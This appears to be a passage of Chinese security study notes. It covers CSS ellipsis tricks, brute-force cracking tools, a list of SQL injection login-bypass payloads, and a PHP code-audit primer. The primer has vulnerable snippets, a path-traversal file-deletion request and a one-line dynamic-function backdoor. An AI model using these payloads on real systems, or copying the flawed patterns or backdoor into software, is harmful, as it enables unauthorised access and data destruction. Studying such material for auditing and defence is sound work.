+			超酷的IT技术学习平台（我是省略号）
+		</div>
+	</body>
+</html>
+```
+
+同时，`word-wrap`也可以用来设置文本行为，当前行超过指定容器的边界时是否断开转行
+
+##### <font color="yellow">0002 多行溢出</font>
+
+针对webkit内核的浏览器以及Opera浏览器
+
+```html
+<!DOCTYPE html>
+<html>
+	<head> 
+		<meta charset="utf-8">
+		<title>text-overflow</title>
+		<style type="text/css">
+		.test_demo{ 
+		    text-overflow:ellipsis;  
+		    overflow:hidden; 
+		    width:200px; //指定宽度
+		    background:#ccc;  
+		    display:-webkit-box;  
+		    -webkit-box-orient:vertical;  
+		    -webkit-line-clamp:3; //指定显示多少行
+		}
+	</style>
+</head> 
+<body>
+	<div class="test_demo">
+		超酷的IT技术学习平台，我是省略号术学习平台，我是省略号我是省略号术学习平台，我是省略我是省略号术学习平台，我是省略
+	</div>
+</body>
+</html>
+```
+
+对于其他浏览器：比较靠谱简单的做法就是设置相对定位的容器高度，用包含省略号(…)的元素模拟实现
+
+```css
+p 
+{
+　　position: relative;
+　　line-height: 1.4em;
+　　height: 4.2em;
+　　overflow: hidden;
+}
+p::after 
+{
+　　content: "...";
+　　font-weight: bold;
+　　position: absolute;
+　　bottom: 0;
+　　right: 0;
+　　padding: 0 20px 1px 45px;
+　　background: url(http://css88.b0.upaiyun.com/css88/2014/09/ellipsis_bg.png) repeat-y;
+}
+```
+
+这里注意几点
+
+- `height`高度正好是`line-height`的3倍
+- 结束的省略好用了半透明的png做了减淡的效果，或者设置背景颜色
+- IE6-7不显示content内容，所以要兼容IE6-7可以是在内容中加入一个标签，比如用…去模拟
+- 要支持IE8，需要将`::after`替换成`:after`
+
+##### <font color="yellow">0003 js插件方式</font>
+
+更为好用的是使用jQuery插件-`jQuery.dotdotdot`
+
+```javascript
+$('.news-left-text').dotdotdot();//先要引入jquery.dotdotdot.js，然后选择文本段落，使用dotdotdot方法
+```
+
+### <font color="yellow">14 暴力破解</font>
+
+暴力破解攻击是最流行的密码破解方法之一，然而，它不仅仅是密码破解，暴力攻击还可用于发现Web应用程序中的隐藏页面和内容，在你成功之前，这种攻击基本上是攻击一次尝试一次，暴力破解是最流行的密码破解方法之一，然而，它不仅仅是密码破解，暴力破解还可用于发现Web应用程序中的隐藏页面和内容，在你成功之前，这种破解基本上是破解一次尝试一次，这种破解有时需要更长的时间，但其成功率也会更高，在本文中，我将尝试解释在不同场景中使用的暴力破解和流行工具，来执行暴力破解并获得所需结果，其实做为一个开发者，有一个学习的氛围跟一个交流圈子特别重要这里我推荐一个开发交流群664389243，不管你是小白还是大牛欢迎入驻，大家一起交流成长
+
+#### <font color="yellow">001 简介</font>
+
+当攻击者使用一组预定义值攻击目标并分析响应直到他成功，这就叫做暴力攻击，它的成功取决于预定义值的集合，如果它越大，就会需要更多时间，但成功的可能性也会变大，最常见且最容易理解的暴力攻击是破解密码的字典攻击，在这种情况下，攻击者使用包含数百万个可作为密码的单词的密码字典，然后攻击者逐个尝试这些密码并进行身份验证，如果字典中包含正确的密码，攻击者将会成功，在传统的暴力攻击中，攻击者只是尝试字母和数字的组合来顺序生成密码，但是，当密码足够长的时候，这种技术就会需要更长的时间，这些攻击可能需要几分钟到几小时甚至是几年的时间，具体取决于所使用的系统和密码的长度，为了防止暴力破解密码，应始终使用长而复杂的密码，这会使得攻击者很难猜到密码，暴力攻击会花费更多的时间，大多数时候，WordPress用户面临对其网站的暴力攻击，帐户锁定是防止攻击者对Web应用程序执行暴力攻击的一种方法，但是，对于离线软件，事情就没这么简单了，为了发现隐藏页面，攻击者会尝试猜测页面名称，发送请求并查看响应，如果该页面不存在，它将显示响应404，成功的话就会响应200，这样，它可以在任何网站上找到隐藏页面，暴力攻击也用于破解散列并从给定散列中猜出密码，这样的话，哈希是从随机密码生成的，然后此哈希与目标哈希匹配，直到攻击者找到正确的哈希，因此，用于加密密码的加密类型(64位、128位或256位加密)越高，暴力破解所需的时间就会越长
+
+#### <font color="yellow">002 逆向暴破</font>
+
+逆向暴力攻击是另一个与密码破解相关的术语，破解密码采用相反的方法，攻击者针对多个用户名尝试一个密码，想想你是否有知道密码但是不知道用户名的时候，在这种情况下，你可以尝试使用相同的密码去猜测不同的用户名，直到找到匹配组合，现在，您知道暴力攻击主要用于密码破解，您可以在任何软件，任何网站或任何协议中使用它，只要目标在几次无效尝试后不会组织请求就行
+
+#### <font color="yellow">003 工具</font>
+
+##### <font color="yellow">0001 Aircrack-NG</font>
+
+这是一款免费的无线密码破解工具，该工具附带WEP/WPA/WPA2-PSK破解程序和分析工具，可对WiFi 802.11进行攻击，Aircrack-ng可用于任何支持监听模式的网卡，它基本上是采用密码字典攻击来猜测无线密码，如您所知，攻击的成功取决于密码字典，密码字典越好越有效，它适用于Windows和Linux平台，它也被移植到iOS和Android平台上运行，您可以尝试使用给定的平台来研究此工具的工作原理
+
+##### <font color="yellow">0002 John the Ripper</font>
+
+开膛手约翰也是一款几乎人人皆知的工具，它长期以来一直是进行暴力攻击的最佳选择，这个免费的密码破解工具最初是为Unix系统开发的，后来，开发人员又为其他平台发布了这款工具，现在它支持15种不同的平台，包括Unix\Windows、DOS、Linux、BeOS和OpenVMS等，您可以使用它来识别弱密码或破解密码来通过身份验证，这款工具非常受欢迎，并结合了各种密码破解功能，它可以自动检测密码中使用的哈希类型，因此，您也可以针对加密密码存储运行它，基本上，它可以通过组合字母和数字对所有可能的密码执行暴力破解，但是您也可以将其与密码字典一起使用来执行字典攻击
+
+##### <font color="yellow">0003 Rainbow Crack</font>
+
+Rainbow Crack也是一款用于密码破解的流行工具，它会生成彩虹表，以便在执行攻击时使用，这也使得它与其他的暴力破击工具不同，彩虹表是预先计算的，它有助于减少执行攻击的时间，幸运的是，有各种组织已经为所有互联网用户发布了前计算机的彩虹表，为了节省时间，您可以下载这些彩虹表并在攻击中使用，该工具仍然在积极开发中，它适用于Windows和Linux，并支持这些平台的所有最新发行版
+
+##### <font color="yellow">0004 Cain & Able</font>
+
+同样也是一款热门的工具，它可以通过执行暴力攻击、字典攻击和密码分析攻击来帮助破解各种密码，密码分析攻击是通过使用前一种工具中提到的彩虹表来完成的，值得一提的是，一些病毒查杀软件会将其检测为恶意软件，Avast和Microsoft Security Essentials将其报告为恶意软件并会组织它的运行，如果您需要使用这款软件，您需要先和您的杀毒软件打好招呼
+
+它的基本功能是
+
+- 嗅探网络
+- 使用字典破解加密密码
+- 暴力和密码分析攻击
+- 录制VoIP会话
+- 解码加密密码
+- 恢复无线网络密钥
+- 揭示密码框
+- 发现缓存中的密码
+- 分析路由协议
+
+该工具的最新版本具有很多功能，并添加了嗅探来执行中间人攻击
+
+##### <font color="yellow">0005 L0phtcrack</font>
+
+L0phtCrack以破解Windows密码的能力而闻名，它使用字典、暴力破解、混合攻击和彩虹表，L0phtCrack最显著的特性是调度、64位Windows版本的哈希提取、多处理器算法以及网络监控和解码，如果要破解Windows系统的密码，可以尝试使用此工具
+
+##### <font color="yellow">0006 Ophcrack</font>
+
+Ophcrack是另一款专门用于破解Windows密码的暴力破解工具，它通过彩虹表使用LM哈希来破解Windows密码，它是一款免费的开源工具，在大多数情况下，它可以在几分钟内破解Windows密码，默认情况下，Ophcrack附带的彩虹表能够破解少于14个字符的密码，其中只包含字母数字字符，其他彩虹表也可供下载，Ophcrack还可用作LiveCD
+
+##### <font color="yellow">0007 Crack</font>
+
+Crack是一款古老的密码破解工具，它是Unix系统的密码破解工具，用于通过执行字典攻击来检查弱密码
+
+##### <font color="yellow">0008 Hashcat</font>
+
+Hashcat号称是最快的基于CPU的密码破解工具，它是免费的，适用于Linux、Windows和Mac OS平台，Hashcat支持各种散列算法，包括LM Hashes、MD4、MD5、SHA系列、Unix Crypt格式、MySQL、Cisco PIX，它支持各种攻击形式，包括暴力破解、组合攻击、字典攻击、指纹攻击、混合攻击、掩码攻击、置换攻击、基于规则的攻击、表查找攻击和Toggle-Case攻击
+
+##### <font color="yellow">0009 SAMInside</font>
+
+SAMInside同样专门用于破解Windows操作系统的密码，它类似于Ophcrack和Lophtcrack工具，它声称在一台电脑上最高可以每秒破解大约1000万个密码，它支持各种攻击方法，包括掩码攻击、字典攻击、混合攻击和彩虹表攻击，它支持400多种哈希算法
+
+##### <font color="yellow">0010 DaveGrohl</font>
+
+DaveGrohl是适用于Mac OS X的流行破解工具，它支持所有可用版本的Mac OS X，此工具支持字典攻击和增量攻击，它还具有分布式模式，允许您从多台计算机执行攻击以攻击相同的密码哈希，此工具现在是开源的，您可以从源码进行安装
+
+##### <font color="yellow">0011 Ncrack</font>
+
+Ncrack用于破解网络身份验证，它支持各种协议，包括RDP、SSH、HTTP(S)、SMB、POP3(S)、VNC、FTP和telnet，它可以执行不同的攻击，包括暴力破解等，支持包括Linux、BSD、Windows和Mac OS X等操作系统
+
+##### <font color="yellow">0012 THC Hydra</font>
+
+九头蛇以其通过执行暴力攻击来破解网络身份验证的能力而闻名，它可对多种协议执行字典攻击，包括telnet、FTP、HTTP、HTTPS、SMB等，它适用于多种平台，包括Linux、Windows、Cygwin、Solaris、FreeBSD、OpenBSD、OSX和QNX/BlackBerry等，这些都是用于密码破解的流行工具，还有各种其他工具可用于对不同类型的身份验证执行暴力破解，如果我只举几个小工具的例子，你会看到大多数PDF破解、ZIP破解工具使用相同的暴力破解方法来执行攻击，有许多此类工具可免费或付费使用
+
+#### <font color="yellow">004 总结</font>
+
+暴力破解是破解密码最常用的方法，攻击的成功取决于各种因素，但是，影响最多的因素是密码的长度以及数字、字母和特殊字符的组合，这就是我们谈论强密码的原因：我们通常建议用户使用小写字母、大写字母、数字和特殊字符组合的长密码，它不会使得暴力破解不可能，但会让其变得十分困难，这样，暴力破解会需要更长的时间来破解密码，几乎所有的散列破解算法都使用暴力破解来尝试，当您对数据进行脱机访问时，此攻击最佳，在这种情况下，它易于破解，而且会花费更少的时间，暴力密码破解在计算机安全性方面非常重要，它用于检查系统、网络或应用程序中使用的弱密码，防止暴力攻击的最佳方法是限制无效登录，通过这种方式，攻击只能在有限的时间点击并尝试密码，这就是为什么基于网络的服务开始使用验证码，如果您三次输入错误的密码他们会对您的IP地址进行屏蔽
+
+### <font color="yellow">15 万能密码</font>
+
+#### <font color="yellow">001 SQL万能密码</font>
+
+- `admin' or 1=1#`
+- `'or 1=1`
+- `"or "a"="a`
+- `"or 1=1--`
+- `"or"="`
+- `"or"="a'='a`
+- `"or1=1--`
+- `"or=or"`
+- `''or'='or'`
+- `') or ('a'='a`
+- `'.).or.('.a.'='.a`
+- `'or 1=1`
+- `'or 1=1--`
+- `'or 1=1/*`
+- `'or"="a'='a`
+- `'or' '1'='1'`
+- `'or''='`
+- `'or''=''or''='`
+- `'or'='1'`
+- `'or'='or'`
+- `'or.'a.'='a`
+- `'or1=1--`
+- `1'or'1'='1`
+- `a'or' 1=1--`
+- `a'or'1=1--`
+- `or 'a'='a'`
+- `or 1=1--`
+- `or1=1-- `
+
+#### <font color="yellow">002 asp/aspx万能密码</font>
+
+- `"or "a"="a`
+- `'.).or.('.a.'='.a`
+- `or 1=1--`
+- `'or 1=1--`
+- `a'or' 1=1--`
+- `"or 1=1--`
+- `'or.'a.'='a`
+- `"or"="a'='a`
+- `'or''='`
+- `or'='or' `
+
+#### <font color="yellow">003 javascript万能密码</font>
+
+- `1'or'1'='1`
+- `admin' or 1=1`
+
+### <font color="yellow">16 代码审计</font>
+
+[http://www.freebuf.com/sectool/101256.html](http://www.freebuf.com/sectool/101256.html)
+
+[https://www.owasp.org/index.php](https://www.owasp.org/index.php)
+
+[https://www.dwheeler.com/essays/static-analysis-tools.htm](https://www.dwheeler.com/essays/static-analysis-tools.htm)
+
+[https://www.dwheeler.com/essays/static-analysis-tools.html](https://www.dwheeler.com/essays/static-analysis-tools.html)
+
+[https://github.com/mre/awesome-static-analysis](https://github.com/mre/awesome-static-analysis)
+
+[https://en.wikipedia.org/wiki/List_of_tools_for_static_code_analysis](https://en.wikipedia.org/wiki/List_of_tools_for_static_code_analysis)
+
+[https://www.dwheeler.com/secure-programs/3.71/Secure-Programs-HOWTO/index.html](https://www.dwheeler.com/secure-programs/3.71/Secure-Programs-HOWTO/index.html)
+
+#### <font color="yellow">001 PHP代码审计</font>
+
+RIPS开源
+
+> 一款开源的，具有较强漏洞挖掘能力的自动化代码审计工具，它使用PHP语言编写的，用于静态审计PHP代码的安全性
+> 
+> 代码安全审计RIPS的主要功能特点如下
+> 
+> - 能够检测XSS、SQL注入、文件泄露、本地/远程文件包含、远程命令执行以及更多种类型的漏洞
+> - 有5种级别选项用于显示以及辅助调试扫描结果
+> - 标记存在漏洞的代码行
+> - 对变量高亮显示
+> - 在用户定义函数上悬停光标可以显示函数调用
+> - 在函数定义和调用之间灵活跳转
+> - 详细列出所有用户定义函数(包括定义和调用)、所有程序入口点(用户输入)和所有扫描过文件(包括include的文件)
+> - 以可视化的图表展示源代码文件、包含文件、函数及其调用
+> - 仅用几个鼠标点击就可以使用CURL创建针对检测到漏洞的EXP实例
+> - 详细列出每个漏洞的描述、举例、PoC、补丁和安全函数
+> - 7种不同的语法高亮显示模式
+> - 使用自顶向下或者自底向上的方式追溯显示扫描结果
+> - 一个支持PHP的本地服务器和浏览器即可满足使用需求
+> - 正则搜索功能
+> 
+> 当前有商业版，但开源已经够用了，最新版本的RIPS是0.55[https://sourceforge.net/projects/rips-scanner/](https://sourceforge.net/projects/rips-scanner/)
+
+#### <font color="yellow">002 Java代码审计</font>
+
+代码质量：findbugs
+
+代码安全：findsecuritybugs 
+
+FindSecurityBugs是Java静态分析工具FindBugs的插件，通过一系列的规则发现代码中的Java安全漏洞，这个工具可以集成在很多IDE中，包括Eclipse或IntelliJ，目前这个项目已经在安全社区中获得了不少关注度，该工具的最新版本还增加了专门针对Android端产品的漏洞类型，因此，它也是一个不错的移动端安全扫描工具
+
+如果你想更详细的了解它，可以去访问
+
+[http://findbugs.sourceforge.net/downloads.html](http://findbugs.sourceforge.net/downloads.html)
+
+[https://www.jianshu.com/p/c43940c4e025](https://www.jianshu.com/p/c43940c4e025)
+
+[https://find-sec-bugs.github.io/](https://find-sec-bugs.github.io/)
+
+[https://wiki.jenkins.io/display/JENKINS/FindBugsPlugin](https://wiki.jenkins.io/display/JENKINS/FindBugsPlugin)
+
+#### <font color="yellow">003 其他语言代码审计</font>
+
+##### <font color="yellow">0001 net</font>
+
+[https://security-code-scan.github.io/](https://security-code-scan.github.io/)
+
+##### <font color="yellow">0002 C++</font>
+
+代码质量：cppcheck
+
+代码安全：flawfinder
+
+[https://sourceforge.net/projects/flawfinder/](https://sourceforge.net/projects/flawfinder/)
+
+[http://www.doc88.com/p-669125880049.html](http://www.doc88.com/p-669125880049.html)
+
+[https://sourceforge.net/p/flawfinder/feature-requests/4/](https://sourceforge.net/p/flawfinder/feature-requests/4/)（xml格式支持）
+
+##### <font color="yellow">0003 JS</font>
+
+代码质量：eslint
+
+[https://github.com/ajinabraham/NodeJsScan](https://github.com/ajinabraham/NodeJsScan)
+
+[https://blog.csdn.net/yalishandalee/article/details/61916454](https://blog.csdn.net/yalishandalee/article/details/61916454)
+
+[https://github.com/nodesecurity/eslint-plugin-security#rules](https://github.com/nodesecurity/eslint-plugin-security#rules)
+
+##### <font color="yellow">0004 Go</font>
+
+代码质量：golint
+
+代码安全：gas
+
+[https://github.com/GoASTScanner/gas](https://github.com/GoASTScanner/gas)
+
+##### <font color="yellow">0005 Python</font>
+
+代码质量：pylint
+
+代码安全：bandit    py-find-injection    pyt
+
+[https://wiki.openstack.org/wiki/Security/Projects/Bandit](https://wiki.openstack.org/wiki/Security/Projects/Bandit)
+
+[https://github.com/openstack/bandit](https://github.com/openstack/bandit)
+
+[https://github.com/uber/py-find-injection](https://github.com/uber/py-find-injection)
+
+[https://github.com/bit4woo/python_sec](https://github.com/bit4woo/python_sec)
+
+[https://github.com/python-security/pyt](https://github.com/python-security/pyt)
+
+##### <font color="yellow">0006 多种语言的安全代码检查工具</font>
+
+sonar
+
+[https://docs.sonarqube.org/display/SONAR](https://docs.sonarqube.org/display/SONAR)
+
+[https://www.sonarsource.com/products/codeanalyzers/sonarjava/rules.html#Vulnerability_Detection](https://www.sonarsource.com/products/codeanalyzers/sonarjava/rules.html#Vulnerability_Detection)
+
+[https://github.com/SonarSource/sonarqub](https://github.com/SonarSource/sonarqub)
+
+##### <font color="yellow">0007 ruby</font>
+
+[https://github.com/thesp0nge/dawnscanner](https://github.com/thesp0nge/dawnscanner)
+
+[https://github.com/presidentbeef/brakeman](https://github.com/presidentbeef/brakeman)
+
+#### <font color="yellow">004 商业代码审计工具</font>
+
+其实网上都说烂了，静态分析的工具RISP，VCG，Fortify SCA等，动态工具有360的sky wolf，鸟哥的taint
+
+静态分析还有几个[https://github.com/wufeifei/cobra](https://github.com/wufeifei/cobra)
+
+这是一个简单的通过正则查找漏洞的工具[https://grepbugs.com/](https://grepbugs.com/)
+
+taint只支持php5.4.*及以前的版本，最新的php是不支持的
+
+#### <font color="yellow">005 代码审计入门</font>
+
+##### <font color="yellow">0001 整体</font>
+
+学习代码审计的目标是能够独立完成对一个CMS的代码安全监测
+
+其通用的思路有
+
+- 通读全文代码，从功能函数代码开始阅读，例如`include`文件夹下的`common_fun.php`，或者有类似关键字的文件
+- 看配置文件，带有`config`关键字的文件，找到`mysql.class.php`文件的`connect()`函数，查看在数据库连接时是否出现漏洞
+- 继续跟读首页文件，`index.php`，了解程序运作时调用了哪些函数和文件以`index.php`文件作为标线，一层一层去扩展阅读所包含的文件，了解其功能，之后进入其功能文件夹的首页文件，进行扩展阅读
+
+##### <font color="yellow">0002 漏洞</font>
+
+###### <font color="yellow">a. 文件操作漏洞</font>
+
+能不用文件名参数就不用尽量不要让用户可控，平行用户的权限管理员的权限操作权限，禁止传入参数类似于这种`..`、`/`、`\`检查传入的参数，做出限制，停止程序往下执行
+
+文件包含漏洞
+
+> 1. 本地文件包含
+> 
+>   一般存在于模块加载，模板加载，cache调用包括函数
+> 	
+>   `include()/include_once()`
+> 	
+>   `require()/require_once()`
+> 
+> 	寻找可控变量
+> 
+>   1. php
+> 
+> 		```php
+> 		<?php
+> 			dirfine("ROOT",dirname(__FILE__).'/');
+> 			$mod = $_GET('mod');
+> 			include(ROOT.$mod.'.php');
+> 		?>
+> 		```
+> 	2. php
+> 	
+>   	```php
+> 		<?php phpinfo() ?>
+> 		```
+> 
+> 2. 远程文件包含
+> 
+>   前提条件`allow_url_include = on`
+> 
+>   出现频率不如本地包含
+> 
+> 3. 文件包含截断
+> 
+>   `%00`截断(php版本5.3)
+>   
+>   `？`截断(问好后面相当于请求到参数，伪截断)
+>   
+>   英文(`.`)反斜杠(`/`)截断
+
+文件读取(下载)漏洞
+
+> 搜索关键函数
+> 
+> - `file_get_contents()`
+> - `highlight_file()`
+> - `fopen()`
+> - `read file()`
+> - `fread()`
+> - `fgetss()`
+> - `fgets()`
+> - `parse_ini_file()`
+> - `show_source()`
+> - `file()`
+
+文件上传漏洞
+
+> 搜索关键函数：`move_uploaded_file()`接着看调用这个函数的代码是否存在为限制上传格式或者可以绕过
+> 
+> 未过滤或本地过滤：服务器端未过滤，直接上传PHP格式的文件即可利用
+> 
+> 黑名单扩展名过滤：限制不够全面
+> 
+> IIS默认支持解析`.asp`、`.cdx`、`.asa`、`.cer`等
+> 
+> 扩展名可绕过
+> 
+> ```php
+> <?php
+> 	function getExt($filename)
+> 	{
+> 		return substr($file,strripos($filename,'.')+1);
+> 	}
+> 	$disallowed_types = array("php","asp","aspx");
+> 	$filenameExt = strtolower(getExt($_FILES['file']['name']));
+> 	if(in_array($filenameExt,$disallowed_types))
+> 	{
+> 		die("disallow type");
+> 	}
+> 	else
+> 	{
+> 		$filename = time().".".$filenameExt;
+> 		move_uploaded_file($_FILES['file']['temp'],'upload/'.$filename);
+> 	}
+> ?>
+> ```
+> 
+> 不被允许的文件格式`.php`，但是我们可以上传文件名为`1.php`(注意后面有一个空格)
+> 
+> 文件头`content-type`验证绕过
+> 
+> - getimagesize()函数
+> 
+> 	验证文件头只要为GIF89a，就会返回真
+> 
+> - 限制$_FILES["file"]["type"]的值就是人为限制content-type为可控变量
+> 
+> 防范
+> 
+> 使用`in_array()`或利用三等于`===`对比扩展名，保存上传文件是重命名，规则采用时间戳拼接随机数`md5(time() + rand(1,1000))`
+
+文件删除漏洞
+
+> 1. 搜索关键函数
+> 
+>   `unlink()`利用回溯变量的方式
+> 
+>   老版本下的`session_destroy()`，可以删除文件，现已基本被修复
+> 
+> 2. `Metinfo`的任意文件删除漏洞
+> 
+>   ```php
+> 	<?php
+> 		$action = $_GET['action'];
+> 		$filename = $_GET['filename'];
+> 		if($action = "delete") {
+> 			if(is_array($filenames)) {
+> 				foreach($filenames as $filename) {
+> 					unlink('../../databack'.$filename)；
+> 				}
+> 			}
+> 		}
+> 		else {
+> 			if(fileext($filenames) == "sql") {
+> 				$filenamearray = explode(".sql",$filename);
+> 				unlink('../../databack'.$filename);
+> 				unlink('../../databack/sql/metinfo_'.$filenamearray[0].'zip');
+> 			} 
+> 			elae {
+> 				unlink('../../databack/'.$fileon.'/'.$filename);
+> 			}
+> 		}
+> 	?>
+> 	```
+> 
+>   `$action = delete`即可删除`.sql`的文件，如果文件不是`sql`直接删除提交的文件名
+> 
+>   `target.com/recovery.php?&action=delete&filename=../../index.php`
+
+###### <font color="yellow">b. 代码执行漏洞</font>
+
+代码执行函数
+
+> 1. 搜索关键函数
+> 
+> - `eval()`
+> - `assert()`
+> - `preg_replace()`
+> - `call_user_func()`
+> - `call_user_func_array()`
+> - `array_map()`
+> 
+> 2. `preg_replace()`函数
+> 
+> `mixed preg_replace(mixed $pattern,mixed $replacement,mixed $subject[, int $limit = -1[, int &$count]])`
+> 
+> 当`$pattern`处存在`e`修饰符时，`$replacement`会被当做php代码执行
+> 
+> 3. `mixed call_user_func(callable $callbank[`, `mixed $parameter[`, `mixed$…)`
+> 
+> 第一个参数为回调函数，第二个参数是回调函数的参数
+> 
+> ```php
+> <?php
+> 	$b = "phpinfo()";
+> 	call_user_func($_GET['a'],$b);
+> ?>
+> ```
+> 
+> 4. `eval()`和`assert()`
+> 
+> 当`assert()`的参数为字符串时，可执行PHP代码
+> 
+> - `eval("phpinfo();"); = False`
+> - `eval("phpinfo()"); = True`
+> - `assert("phpinfo();"); = True`
+> - `assert("phpinfo()"); = False`
+
+动态函数运行
+
+> 1. 动态函数后门
+> 
+> ```php
+> #!php
+> <?php
+> 	$_GET['a']($_GET['b']);
+> ?>
+> ```
+> 
+> 2. 命令执行函数
+> 
+> 搜索关键函数
+> 
+> > - system()
+> > - exec()
+> > - shell_exec()
+> > - passthru()
+> > - pcntl_exec()
+> > - popen()
+> > - proc_open()
+> 
+> `popen`和`proc_open()`
+> 
+> > ```php
+> > #!php
+> > <?php 
+> > 	popen('whoami>>/Users/bingdaojueai/Desktop/1.txt','r');
+> > ?>
+> > ```
+> > 
+> > 所在路径就会出现一个1.txt里面的内容为命令执行后的结果
+> 
+> 反引号命令执行
+> 
+> > ```php
+> > echo …
+> > ```
+> > 
+> > 双引号和单引号的区别
+> > 
+> > ```php
+> > #!php
+> > $a = 1
+> > echo "$a" = output:1
+> > echo '$a' = output:$a
+> > ```
+> > 
+> > 双引号时，可以直接解析变量，造成代码执行漏洞，google绕过
+
+变量覆盖漏洞
+
+> 1. 函数使用不当
+> 
+> `int extract(array &$var_array,int $extract_type = EXTR_OVERWRITE,string $prefix = null)`
+> `void parse_str(string $str,array &$arr)`
+> `bool import_request_variables(string $type,string $prefix)`
+> 
+> 2. `$$`变量覆盖
+> 
+> ```php
+> <?php
+> $a = 1;
+> foreach(array("_COKKIE","POST","GET") as $_request) {
+> 	foreach($$_request as $_key => $value) {
+> 		echo $_key."<br>";
+> 		$$_key = addslashes($value);
+> 	}
+> }
+> echo $a;
+> ?>
+> ```
+
+逻辑漏洞
+
+> 需要思考的问题
+> 
+> - 程序是否可以重复安装
+> - 修改密码是否存在越权修改其他用户密码
+> - 找回密码验证码是否可以暴力破解
+> - cookie是否可以预测验证存在绕过
+> 
+> 1. 等于与存在判断绕过
+> 
+> > 1. in_array()
+> >     
+> >     比较之前会自动转换类型
+> >     ```php
+> > 	<?php
+> > 		if(in_array($_GET['type_id'],array(1,2,3,4))) {
+> > 			$sql = "SELECT ... WHERE type_id = '".$_GET['type_id']."'";
+> > 		}
+> > 	?>
+> > 	```
+> > 
+> > 2. is_numeric()
+> > 	
+> >     当传入参数为hex时直接通过并返回true并且MYSQL可以直接使用hex编码代替字符串明文可以二次注入并且可能造成XSS漏洞
+> > 
+> > 3. 双等于`==`和三等于`===`
+> >     
+> > 	双等于会在变量比较时，进行类转换，与`in_array()`是一样的问题
+> > 	
+> >     三等于是type和value的双重比较，相比之下更加安全
+> 
+> 2. 账户体系中的越权问题
+> 
+> > - 水平越权
+> >     
+> >    	A用户能够以B用户的身份，进行B用户的全部权限操作，前提A用户和B用户拥有相同的权限
+> >     
+> > - 垂直越权
+> >     
+> > 	A用户能够以C用户的身份，进行C用户的全部权限操作，前提C用户比A用户拥有更高的权限
+> > 
+> > 1. 未exit/return/die
+> > 	```php
+> > 	#!php
+> > 	<?php
+> > 		if(file_exists(install.lock)) {
+> > 			header("Location:xxx.com");
+> > 			//exit();
+> > 		}
+> > 		echo "test";
+> > 	?>
+> > 	```
+> >     
+> > 	test依旧会被输出，替换成安装流程，PHP依旧会进行
+> > 
+> > 2. 支付漏洞
+> >     
+> > 	- 客户端修改单价
+> > 	- 客户端修改总价和购买数量
+> > 	- 服务端未校验严格
+> > 	- 重复发包利用时间差
+> > 		
+> >         ```php
+> > 		#!php
+> > 			<?php
+> > 			if (check_money($price)) {
+> > 				//Do something
+> > 				//花费几秒
+> > 				$money = $money - $price;
+> > 			}
+> > 		?>
+> > 		```
+> > 	
+> >     - 可能导致漏洞函数
+> >         
+> > 		`str_replace()`
+> > 		
+> >         ```php
+> > 		<?php
+> > 			//省略
+> > 			$order_sn = str_replace($_GET['subject'],'',$_GET['out_trade_no']);
+> > 			$order_sn = trim($order_sn);
+> > 			if(!check_money($order_sn,$_GET['total_fee'])) {
+> > 				//省略
+> > 			}
+> > 			function check_money($log_id,$money) {
+> > 				$sql = "SELECT order_amount FROM xx WHERE log_id = '".$log_id."'";
+> > 				//省略
+> > 			}
+> > 		?>
+> > 		```
+> >         
+> >         ```php
+> > 		#!php
+> > 		<?php
+> > 			$a = addslashes($_GET['a']);
+> > 			$b = addslashes($_GET['b']);
+> > 			echo "$a<br>$b<br>";
+> > 			$c = str_replace($a,'',$b);
+> > 			echo trim($c);
+> > 		?>
+> > 		```
+> > 
+> > 3. 会话认证漏洞
+> > 
+> > 	cookie验证：没有使用session验证，将信息直接保存在cookie中，找到传入sql语句的参数的传递过程，回溯变量到最原始的函数，看它保存在cookie的算法是否可逆，和md5比起，sha1更安全，解密sha1的网站更少，限制一个用户只能同时在一个IP上登录，审计代码时，查看登录处的代码
+> 
+> 3. 二次漏洞
+> 
+> > 1. 类型
+> > 	不是逻辑问题，业务逻辑复杂度，与二次漏洞触发率成正比
+> > 	
+> >     购物车/订单引用数据/文章编辑/草稿 = SQL注入/XSS
+> > 	
+> >     ```php
+> > 	<?php
+> > 		$conn = mysql_connect("localhost","root","root");
+> > 		mysql_select_db("test",$sonn);
+> > 		$a = addslashes($_POST['pwd']);
+> > 		if(!empty($a) && isset($_POST['sub'])) {
+> > 			$sql1 = "UPDATE user SET password = '".$a."' WHERE name = 'sixwhale'";
+> > 			$sql2 = "SELECT * FROM user WHERE name = 'sixwhale'";
+> > 			if(mysql_query($sql1)) {
+> > 				echo "update ok<br>";
+> > 			}
+> > 			else {
+> > 				echo mysql_error();
+> > 			}
+> > 			if($row = mysql_fetch_assoc(mysql_query($sql2))) {
+> > 				echo "select ok<br>";
+> > 			}
+> > 		}
+> > 		else {
+> > 			echo "no";
+> > 		}
+> > 		echo "select * from xx where = '".$row['password']."'<br>";
+> > 		echo $a;
+> > 	?>
+> > 	<html>
+> > 		<from action="" method="POST">
+> > 			<input type="text" name="pwd">
+> > 			<input type="submit" name="sub">
+> > 		</from>
+> > 	</html>
+> > 	```
+> > 
+> > 2. 技巧
+> > 	
+> >     - 钻GPC等转义的空子
+> >         
+> > 		- 不受GPC保护的`$_SERVER`变量
+> > 		    
+> >         	PHP5以后，`$_SERVER`取到的`header`不再受GPC影响，就算开启特殊字符也不会被转义，存在注入
+> > 		
+> >         - 编码问题转换
+> > 		    
+> >             GBK的宽字节注入：`%df '`单引号自动被转义成(`%5c`)，同时`%df`与`%5c`连在一起组合成運字单引号依然在，成功闭合(php与mysql交互过程中发生的编码转换问题)
+> > 			
+> >             `mb_convert_encoding()`
+> >             
+> > 			```php
+> > 			#!php
+> > 			<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/> 
+> > 			<?php
+> > 				$sql = "WHERE id='".urldecode("-1%df%5c' == ")."'"; 
+> > 				print_r(mb_convert_encoding($sql,"UTF-8","GBK"));
+> > 			?>
+> > 			```
+> >     
+> > 	- 字符串问题(利用报错，找到敏感信息)
+> >         
+> > 		- 字符串截断
+> >             
+> > 			- `%00`空字符截断
+> > 				
+> >                 PHP版本小于5.3
+> > 				```php
+> > 				#!php
+> > 				<?php
+> > 					include($_GET['file'].'.php');
+> > 					//1.php?file=2.txt%00
+> > 					//2.txt里面是 <?php phpinfo()?>
+> > 				?>
+> > 				```
+> >             
+> > 			- `iconv`函数字符编码转换截断
+> > 				
+> >                 对PHP版本有要求
+> > 				```php
+> > 				#!php
+> > 				chr(128)—chr(255)可以截断字符
+> > 				<?php 
+> > 					$a = '1'.chr(130).'2’; 
+> > 					echo $a."<br>";// 1�2
+> > 					echo iconv("UTF-8", "GBK", $a);// 1
+> > 				?>
